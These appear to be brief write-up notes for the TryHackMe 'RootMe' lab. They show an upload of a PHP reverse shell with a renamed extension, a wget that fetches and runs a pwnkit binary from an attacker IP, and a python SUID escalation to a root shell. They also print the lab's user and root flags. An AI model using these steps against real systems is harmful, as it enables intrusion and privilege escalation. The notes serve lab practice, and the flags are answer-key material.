#TryHackMe #linux 
# Enumeration
## Nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Aggressive OS guesses: Linux 3.1

# Exploit 
┌──(root㉿kali)-[/home/kali/Desktop]
└─# mv php-reverse-shell.pHp php-reverse-shell.pHP5 

## upload php-reverse-shell.pHP5 in http://10.10.15.241/panel/

# FootHold
## Enum
Linux version 4.15.0-112-generic
/home/rootme/.profile
/home/rootme/.sudo_as_admin_successful
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  -->  Linux4.10_to_5.1.17

## Exploit && PrivEsc
### with pwnkit
	[www-data@rootme:/tmp$] wget http://10.2.28.175/pwnkit
	[www-data@rootme:/tmp$ ]chmod +x pwnkit
	[www-data@rootme:/tmp$] ./pwnkit
	[root@rootme:/tmp# ]
### with python
	www-data@rootme:/tmp$ python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
	bash-4.4# cat /root/root.txt
	cat /root/root.txt

[root@rootme:~# ]find / -type f -name user.txt
/var/www/user.txt
[root@rootme:~# ]cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
[root@rootme:~#] cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}



